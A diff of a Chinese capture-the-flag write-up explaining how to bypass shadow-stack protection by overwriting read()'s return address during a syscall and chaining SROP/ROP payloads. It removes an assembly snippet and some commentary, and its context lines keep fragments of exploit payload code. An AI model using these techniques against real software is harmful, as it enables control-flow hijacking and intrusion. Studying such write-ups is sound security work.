@@ -322,16 +322,6 @@ shadow的检测无疑是一道坎
 
 当执行`SYS_read`时才真正触发**系统调用**，阻塞并等待中断触发时唤醒读入
 
-即：
-
-```asm
-mov rax, 0
-mov rdi, fd
-mov rsi, buf
-mov rdx, size
-syscall
-```
-
 因此，我们完全可以在执行`SYS_read`读入时覆盖`call read`这个glibc函数的返回地址与rbp，从而绕过检测，控制执行流
 
 那下一步的目标呢?
@@ -487,8 +477,6 @@ payload5 = b'A' * 7 + p64(pop_rbp_ret)
 
 依旧布置`sigcontext`的同时打**栈返回**
 
-原理一致，我就不贴图了
-
 ```python
 payload6 = p64(leave_ret)
 payload6 += p64(magic_gadget)
@@ -578,14 +566,6 @@ payload10 += p64(pop_rax_ret) + p64(1) + p64(pop_rdi_ret) + p64(2) + p64(syscall
 ---
 
 总结:
-
-部分过程原理一致，我便没有详细展开了
-
-但自己学习时一定动手**调试**，方能领悟其真谛
-
-同时不得不感叹
-
-这道题真是惊艳啊
 
 佩服作者的实力
 
